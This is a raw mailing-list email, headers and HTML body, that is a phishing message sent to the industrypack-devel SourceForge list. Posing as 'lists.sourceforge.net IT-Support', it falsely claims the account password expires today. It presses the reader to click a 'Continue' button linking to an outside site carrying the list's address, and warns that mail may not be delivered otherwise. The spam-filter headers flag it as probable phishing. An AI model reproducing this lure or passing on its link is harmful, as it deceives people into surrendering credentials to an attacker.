Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 822FD47AA3A
	for <lists+industrypack-devel@lfdr.de>; Mon, 20 Dec 2021 14:16:37 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mzIWo-0003Q7-SJ
	for lists+industrypack-devel@lfdr.de; Mon, 20 Dec 2021 13:16:35 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <export1@qualitygr.com>) id 1mzIWn-0003Pt-Py
 for industrypack-devel@lists.sourceforge.net; Mon, 20 Dec 2021 13:16:34 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=mhJEZsFnCdt9KNMV/xnwLTns/+yjgRsCMz0qNZIF5tI=; b=kqrzyZgdaynZq1u85ZGw15/xZn
 gEjPEgwPIYhGfgF0CH7joeP5Re7z8ucCS+pbbP02Fb394LsZ2mvDu7ByjTyJnaNEpUjNSPLCCYkul
 gruBF4ePf28pBaHVHWo6C6fYZ1QcnKRbS4cCrsj7RyAcSmNIZe67EqtUM5jTGp5EzNN0=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=mhJEZsFnCdt9KNMV/xnwLTns/+yjgRsCMz0qNZIF5tI=; b=Z
 nB1h6nFMw/nJrNeV1i5k8Nej7401WnRgWUKYNm518bq/e67qW8WXdcclRHKnHoUaMstkSSmu9eh+M
 f5MpYX8OZg15IgGinaDNSQK6oK4pu0T3swX6uwVHBi7ovVBTSdfrbPCvt+uMvFfpWUUeFYVdmTqSV
 h/o+4BfTEqlHBADY=;
Received: from [165.22.101.238] (helo=mta0.qualitygr.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mzIWm-0046oP-Ul
 for industrypack-devel@lists.sourceforge.net; Mon, 20 Dec 2021 13:16:34 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=qualitygr.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=export1@qualitygr.com;
 bh=mhJEZsFnCdt9KNMV/xnwLTns/+yjgRsCMz0qNZIF5tI=;
 b=AuyRAiGX7ev42s0gsgVj1o/Lw6UEtsXKS+9dq0420btRpK4mp4SAlFb1iIvLdz7teYvVTnzdKeoc
 PgJmdLTDqhmDFR6x2r3EizCvd8PyCTyz/MrDY6q5+0MunDCzyPEFC8s1Mn0mxUY7rf3OVGPzXILI
 PBW17o3/8kSsw/+Jy7Q=
From: IT-Support  <export1@qualitygr.com>
To: industrypack-devel@lists.sourceforge.net
Date: 20 Dec 2021 13:56:18 +0100
Message-ID: <20211220135618.2973B17642885A78@qualitygr.com>
MIME-Version: 1.0
X-Spam-Score: 4.2 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: ID: industrypack-devel@lists.sourceforge.net Your
 industrypack-devel@lists.sourceforge.net
 password expires today 12/20/2021 1:56:18 p.m. Use the button below to
 continue with same password 
 Content analysis details:   (4.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 T_SPF_PERMERROR        SPF: test of record failed (permerror)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.6 VFY_ACCT_NORDNS        Verify your account to a poorly-configured MTA -
 probable phishing
 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
X-Headers-End: 1mzIWm-0046oP-Ul
Subject: [Industrypack-devel] Your industrypack-devel@lists.sourceforge.net
 password expires today 12/20/2021 1:56:18 p.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8741902641720306196=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8741902641720306196==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.16438"></HEAD>
<body>ID: industrypack-devel@lists.sourceforge.net<BR><BR>Your industrypack=
-devel@lists.sourceforge.net password expires today 12/20/2021 1:56:18 p.m.=
 <BR><BR>Use the button below to continue with same password<BR><BR>
<P><A style=3D"FONT-SIZE: 15px; TEXT-DECORATION: none; WIDTH: 10%; BACKGROU=
ND: rgb(11,102,35) 0% 50%; COLOR: white; PADDING-BOTTOM: 15px; TEXT-ALIGN: =
center; PADDING-TOP: 15px; PADDING-LEFT: 15px; DISPLAY: block; PADDING-RIGH=
T: 15px; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-i=
nitial; -moz-background-inline-policy: -moz-initial"http://braveday.co.nz/e=
day/?i=3Di&0=3Dindustrypack-devel@lists.sourceforge.net" target=3D_blank>Co=
ntinue </A></P>
<P>Note: Your mails may not be delivered until you verify your account.</P>=

<P>Sincerely,</P>
<P>lists.sourceforge.net IT-Support.</P></BODY></HTML>


--===============8741902641720306196==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8741902641720306196==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8741902641720306196==--
